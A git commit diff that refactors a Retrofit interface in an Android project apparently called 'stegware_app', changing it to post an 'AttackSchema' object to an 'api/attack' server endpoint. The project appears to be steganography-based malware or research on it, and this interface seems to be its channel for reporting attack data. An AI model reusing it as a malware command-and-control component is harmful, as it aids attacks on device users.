5a2eeda259a829a2e1d6df4978cd91ea80a27d67
dj-d <daniele.albanese98@gmail.com>
2021-06-23 19:49:33 +0200

    Fixed server send data

--- app/src/main/java/com/android/stegware_app/api/Send.java
+++ app/src/main/java/com/android/stegware_app/api/Send.java
@@ -1,15 +1,14 @@
 package com.android.stegware_app.api;
 
-import org.json.JSONObject;
+import com.android.stegware_app.api.schema.AttackSchema;
 
 import retrofit2.Call;
-import retrofit2.http.Header;
 import retrofit2.http.POST;
 import retrofit2.http.Body;
 
-public interface SendData {
+public interface Send {
     @POST("api/attack")
-    Call<JSONObject> Send(
-            @Body JSONObject jsonObject
+    Call<String> AttackData(
+            @Body AttackSchema jsonObject
     );
 }
